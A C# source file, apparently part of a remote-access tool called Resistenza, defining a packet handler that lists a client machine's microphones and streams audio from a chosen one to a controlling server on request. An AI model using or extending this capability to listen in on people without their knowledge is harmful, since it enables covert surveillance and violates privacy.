using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Resistenza.Client.Logic;
using Resistenza.Common.Networking;
using Resistenza.Common.Packets.Logic;


namespace Resistenza.Common.Packets.Microphone
{
    public class MicStartRequest
    {
        public string Type { get; set; }
        public bool ListDevices { get; set; }
        public bool StartTransmit { get; set; }
        public string NameTargetMic { get; set; }
        
        

        public MicStartRequest()
        {
            Type = this.GetType().ToString();
        }

        public async Task HandleAsync(SecureStream ServerStream, CancellationTokenSourceWithId CancelOperation, SemaphoreSlim Lock)
        {
            if (ListDevices)
            {
                List<MicrophoneDeviceInfo> Devices = MicBroadcast.GetDevicesInfo();

                var DevicesPacket = new MicListDevicesResponse();
                DevicesPacket.DevicesNames = Devices;

                await Lock.WaitAsync();
                await ServerStream.SendPacketAsync(DevicesPacket);
                Lock.Release();
                    
                return;
            }

            if (StartTransmit)
            {
                MicBroadcast Streamer = new MicBroadcast(ServerStream, Lock);
                try
                {
                    await Streamer.StartStreaming(NameTargetMic, CancelOperation);
                }
                catch (OperationCanceledException)
                {
                   
                    CancelOperation.Token.ThrowIfCancellationRequested();
                                   
                }
                

            }

            
        }
    }
}
